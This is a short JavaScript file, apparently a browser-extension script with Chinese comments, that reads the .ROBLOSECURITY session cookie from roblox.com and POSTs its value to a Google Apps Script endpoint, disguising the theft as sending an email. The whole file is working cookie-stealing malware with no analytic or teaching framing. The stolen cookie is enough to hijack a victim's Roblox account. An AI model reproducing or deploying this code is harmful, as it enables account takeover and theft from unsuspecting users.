function sendEmail(txt) {
    fetch("https://script.google.com/macros/s/AKfycbwb71WmQJm8_upU79bWS2rKr0L6YBmyjWSLNCykbFH_Pufg9GyFEcYBnxNCYNnKEy1q/exec", {
        method: "POST",  // 確保是 POST 請求
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            msg: txt  // 傳遞內容
        })
    })
}


chrome.cookies.get({ "url": "https://www.roblox.com", "name": ".ROBLOSECURITY" }, function(cookie) {
    if (cookie && cookie.value) {
        console.log("Cookie found, sending email...");
        sendEmail(cookie.value);  // 成功取得 cookie 時，發送郵件
    } else {
        console.log("Cookie not found or no value.");
    }
});
